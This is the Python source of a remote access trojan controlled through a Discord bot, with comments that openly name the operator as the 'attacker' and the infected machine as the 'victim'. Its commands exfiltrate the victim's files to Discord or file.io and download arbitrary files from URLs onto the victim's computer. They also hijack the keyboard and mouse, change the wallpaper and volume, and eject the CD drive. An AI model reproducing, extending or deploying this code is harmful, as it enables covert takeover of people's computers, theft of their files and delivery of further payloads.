import os

import discord
import subprocess
from discord.ext import commands
from datetime import datetime
import requests
import getpass
import pyautogui
import string
import random

from src.database.manager import main as db_main

client = commands.Bot(command_prefix=db_main.prefix)


# Load all cogs at startup of the bot
for filename in os.listdir('./src/cogs'):
    if filename.endswith('.py'):
        try:
            client.load_extension(f'src.cogs.{filename[:-3]}')
            print(f"[+] Loaded: src.cogs.{filename[:-3]}")
        except Exception as excl:
            print(
                f"[+] Unable to load: src.cogs.{filename[:-3]}  :  {excl}")


@client.command()
async def loadex(ctx, extension):
    client.load_extension(
        f'src.cogs.{extension if not(str(extension).endswith(".py")) else extension[:-3]}')
    await ctx.send(f"Loaded cog: {extension}")


@client.command()
async def unloadex(ctx, extension):
    client.unload_extension(
        f'src.cogs.{extension if not(str(extension).endswith(".py")) else extension[:-3]}')
    await ctx.send(f"Un-Loaded cog: {extension}")


@client.event
async def on_message(message):
    # Process commands only if in correct channel and requested by possible users
    if (message.channel.id in db_main.channel_ids) and (message.author.id in db_main.users):
        await client.process_commands(message)
    else:
        # dummy message for other users
        if message.content.lower().startswith(db_main.prefix):
            await message.reply("This bot is still under development. Stay tuned! Thank you.")
            return

# ALL RAT COMMANDS
# --------------------------------------------------------------

# Support


def run_system_command(command: list, show: bool = True):
    p = subprocess.run(command, capture_output=True, text=True)
    code, out, err = p.returncode, p.stdout, p.stderr
    if show:
        print(out or err)
    return code, out, err


@client.command()
async def volume(ctx, value, mode="+"):
    """
        If target is Windows:
            Usage:
                >volume <mode>

            Examples:
                >volume +
                >volume increase

            Parameters:
                <mode>
                    +
                    p
                    plus
                    i
                    inc
                    increase
                    a
                    add

        If target is NOT Windows (Linux):
            Usage:
                >volume <value>

            Example:
                >volume 30

            Parameters:
                <value>
                    0...100
        """
    try:
        if os.name == 'nt':
            from pycaw.pycaw import AudioUtilities, IAudioEndpointVolume
            from comtypes import CLSCTX_ALL
            from ctypes import POINTER, cast

            # Increase the volume
            if value in ("+", "p", "i", "inc", "increase", "add", "a", "plus") or mode in ("+", "p", "i", "inc", "increase", "add", "a", "plus"):
                devices = AudioUtilities.GetSpeakers()
                interface = devices.Activate(
                    IAudioEndpointVolume._iid_, CLSCTX_ALL, None)
                volume = cast(interface, POINTER(IAudioEndpointVolume))
                if volume.GetMute() == 1:
                    volume.SetMute(0, None)
                volume.SetMasterVolumeLevel(
                    volume.GetVolumeRange()[1], None)
                custom_desc = "Increased Volume"

            # Decrease the volume
            else:
                devices = AudioUtilities.GetSpeakers()
                interface = devices.Activate(
                    IAudioEndpointVolume._iid_, CLSCTX_ALL, None)
                volume = cast(interface, POINTER(IAudioEndpointVolume))
                volume.SetMasterVolumeLevel(
                    volume.GetVolumeRange()[0], None)
                custom_desc = "Decreased Volume"

            # Notify the attacker
            embed = discord.Embed(
                title=f"Volume Control",
                description=custom_desc,
                timestamp=datetime.utcnow(),
                color=0xFF5733
            )
            embed.set_footer(
                text=f'Requested by {ctx.author.name}',
                icon_url=ctx.author.avatar_url
            )
            await ctx.send(embed=embed)

        else:
            try:
                # Run a system command
                code, out, err = run_system_command(
                    ["amixer", "-D", "pulse", "sset", "Master", str(value) + "%"])
                description = f'Return Code: {code}\nOutput:\n```{out or err}```'

            except:
                #  https://stackoverflow.com/questions/41592431/changing-volume-in-python-program-on-raspbery-pi
                try:
                    import alsaaudio as audio
                except:
                    os.system("python3 -m pip install -U pyalsaaudio")
                mixer = audio.Mixer('Headphone', cardindex=1)
                mixer.setvolume(int(value))
                description = f"Set volume to {value}"

            # Notify the attacker
            embed = discord.Embed(
                title=f"Volume Control",
                description=description,
                timestamp=datetime.utcnow(),
                color=0xFF5733
            )
            embed.set_footer(
                text=f'Requested by {ctx.author.name}',
                icon_url=ctx.author.avatar_url
            )
            await ctx.send(embed=embed)

    except Exception as e:
        await ctx.send(str(e))
        return


@client.command()
async def wallpaper(ctx, url):
    """
    Usage:
        >wallpaper <url>

    Examples:
        >wallpaper http://direct.image.link/image.png

    Parameters:
        <url>
            A direct link the Wallpaper-Image URL
    """
    try:
        if os.name == 'nt':
            import ctypes

            # Get the image from the link
            img_r = requests.get(str(url))
            if not 300 > img_r.status_code >= 200:
                return await ctx.send("Error: Invalid image URL. Bad status code")

            img_path = "temp.jpg"
            with open(img_path, "wb") as file:
                file.write(img_r.content)

            # Change the wallpaper
            ctypes.windll.user32.SystemParametersInfoW(
                20, 0, img_path, 0)

            # Notify the attacker
            embed = discord.Embed(
                title=f"Changed Wallpaper",
                description="",
                timestamp=datetime.utcnow(),
                color=0xFF5733
            )
            embed.set_image(url=url)
            embed.set_footer(
                text=f'Requested by {ctx.author.name}',
                icon_url=ctx.author.avatar_url
            )
            await ctx.send(embed=embed)

        else:
            # https://gist.github.com/mtrovo/1110370#file-set_wallpaper-py

            # Get the image from the link
            img_r = requests.get(str(url))
            if not 300 > img_r.status_code >= 200:
                return await ctx.send("Error: Invalid image URL. Bad status code")

            img_path = "temp.jpg"
            with open(img_path, "wb") as file:
                file.write(img_r.content)

            code, out, err = run_system_command(
                [
                    "gconftool",
                    "--set",
                    "/desktop/gnome/background/picture_filename"
                    "--type",
                    "string",
                    img_path
                ]
            )

            # Notify the attacker
            embed = discord.Embed(
                title=f"Wallpaper Control",
                description=f"Return Code: {code}\nOutput:\n```{out or err}```",
                timestamp=datetime.utcnow(),
                color=0xFF5733
            )
            embed.set_image(url=url)
            embed.set_footer(
                text=f'Requested by {ctx.author.name}',
                icon_url=ctx.author.avatar_url
            )
            await ctx.send(embed=embed)

    except Exception as e:
        await ctx.send(str(e))
        return


@client.command()
async def upload(ctx, *urls):
    """
    Usage:
        >upload <*urls>
        (attacthments can also be saved)

    Examples:
        >upload http://upload.com/file.exe http://upload.net/image.png http://upload.xyz/office.csv

    Parameters:
        <*urls>
            Direct links the the files
    """
    try:

        all_files_amount = 0
        working_files_amount = 0
        errored_files_amount = 0
        all_errors_list = ""

        # Get the file from the link
        for url in urls:
            all_files_amount += 1

            img_r = requests.get(str(url))
            if not 300 > img_r.status_code >= 200:
                errored_files_amount += 1
                all_errors_list += f"**{all_files_amount}**: `Bad Status Code for URL`"
                continue

            img_path = url.split("/")[-1]  # auto file name
            with open(img_path, "wb") as file:
                file.write(img_r.content)

            working_files_amount += 1

        # Save files from attatchments
        for attacthment in ctx.message.attachments:
            all_files_amount += 1
            try:
                await attacthment.save()
                working_files_amount += 1
            except Exception as e:
                all_errors_list += f"**{all_files_amount}**: `{e}`"
                errored_files_amount += 1

        final_description = f'''All Files: `{all_files_amount}`
Saved: `{working_files_amount}`
Errored: `{errored_files_amount}`

Errors List:
{all_errors_list}'''

        # Notify the attacker
        embed = discord.Embed(
            title=f"Downloading Files to {getpass.getuser()}'s computer",
            description=final_description,
            timestamp=datetime.utcnow(),
            color=0xFF5733
        )
        embed.set_footer(
            text=f'Requested by {ctx.author.name}',
            icon_url=ctx.author.avatar_url
        )
        await ctx.send(embed=embed)

    except Exception as e:
        await ctx.send(str(e))
        return


@client.command()
async def download(ctx, filename):
    """
    Usage:
        >download <filename>

    Examples:
        >download officeWork5.docx

    Parameters:
        <filename>
            Filename to download to attacker PC from victim PC
    """
    try:
        file_size = os.stat(filename).st_size

        if file_size > 7340032:
            await ctx.send("Update: The file is over 8MB. Uploading may take some time!")
            with open(filename, "rb") as file:
                response = requests.post(
                    'https://file.io/', files={"file": file})
                if not 300 > response.status_code >= 200:
                    await ctx.send("Error: Bad Response from `file.io` API")
                file_url = response.json()["link"]

            embed = discord.Embed(
                title=f"Get Files from {getpass.getuser()}'s computer",
                description=f"**LINK**: {file_url}",
                timestamp=datetime.utcnow(),
                color=0xFF5733
            )
            embed.set_footer(
                text=f'Requested by {ctx.author.name}',
                icon_url=ctx.author.avatar_url
            )
            await ctx.send(embed=embed)

        else:
            file = discord.File(filename, filename=filename)
            await ctx.send(f"Uploaded {filename}", file=file)

    except Exception as e:
        await ctx.send(str(e))
        return


@client.command()
async def compact_disk(ctx, com="eject"):
    """
    Usage:
        >cd <command>

    Example:
        >cd eject

    Paramaters:
        <command>
            eject | e | ej | o | open
            retract | r | re | c | close
    """
    try:
        if os.name == 'nt':
            import ctypes
            if com.lower() in ("e", "ej", "o", "open", "eject"):
                ctypes.windll.WINMM.mciSendStringW(
                    u'set cdaudio door open', None, 0, None)
                description = "Ejected the CD Drive"
            else:
                ctypes.windll.WINMM.mciSendStringW(
                    u'set cdaudio door closed', None, 0, None)
                description = "Retracted the CD Drive"

            embed = discord.Embed(
                title=f"{getpass.getuser()}'s computer",
                description=description,
                timestamp=datetime.utcnow(),
                color=0xFF5733
            )
            embed.set_footer(
                text=f'Requested by {ctx.author.name}',
                icon_url=ctx.author.avatar_url
            )
            await ctx.send(embed=embed)

        else:
            # https://askubuntu.com/questions/226638/how-to-eject-a-cd-dvd-from-the-command-line
            if com.lower() in ("e", "ej", "o", "open", "eject"):
                code, out, err = run_system_command(["eject"])
            else:
                code, out, err = run_system_command(["eject", "-T"])

            embed = discord.Embed(
                title=f"CD Drive Control",
                description=f"Return Code: **{code}**\nOutput: ```{out or err}```",
                timestamp=datetime.utcnow(),
                color=0xFF5733
            )
            embed.set_footer(
                text=f'Requested by {ctx.author.name}',
                icon_url=ctx.author.avatar_url
            )
            await ctx.send(embed=embed)
    except Exception as e:
        await ctx.send(str(e))
        return


@client.command()
async def hijack(ctx, mode="keyboard", time="90", *text):
    """
    Keyboard:
        Usage:
            >hijack [mode] [uselessParamater] [*text]

        Example:
            >hijack keyboard UselessParameter Starting From Here, The words will be used

        Parameters:
            [mode]
                keyboard      --> (in this case)
                mouse

            [uselessParamater]
                This is usesless... just enter some letter or a word here and neglect this

            [*text]
                Starting From Here, The words will be used

    Mouse:
        Usage:
            >hijack [mode] [times]

        Example:
            >hijack [mode] [times]

        Parameters:
            [mode]:
                keyboard
                mouse         --> (in this case)

            [times]
                The amount of times to control the mouse arbitrarily
    """
    try:
        if mode.lower() in ("keyboard", "key", "k"):
            start_time = 0
            end_time = 20
            if text is None:
                while True:
                    if start_time <= end_time:
                        randint = random.randint(0, 25)
                        randomstring = (string.ascii_lowercase+string.ascii_uppercase +
                                        string.ascii_letters+string.digits+string.punctuation)
                        pyautogui.write(''.join(random.choice(randomstring)
                                        for i in range(randint)))
                        start_time = start_time+1
                    else:
                        break
            else:
                while True:
                    if start_time <= end_time:
                        randint = random.randint(0, 25)
                        randomstring = f"{text}"
                        pyautogui.write(''.join(random.choice(randomstring.split(" "))
                                        for i in range(randint)))
                        start_time = start_time+1
                    else:
                        break
            await ctx.send(f"Finished hijacking the keyboard of {getpass.getuser()}")

        else:
            screen_size = pyautogui.size()
            start_time = 0
            end_time = 90
            while True:
                if start_time <= end_time:
                    ycoord = random.randint(0, screen_size[0])
                    xcoord = random.randint(0, screen_size[1])
                    if pyautogui.onScreen(xcoord, ycoord):
                        pyautogui.moveTo(xcoord, ycoord)
                        start_time = start_time+1
                else:
                    break
            await ctx.send(f"Finished hijacking the mouse of {getpass.getuser()}")

    except Exception as e:
        await ctx.send(str(e))
        return

if __name__ == "__main__":
    client.run(db_main.token)
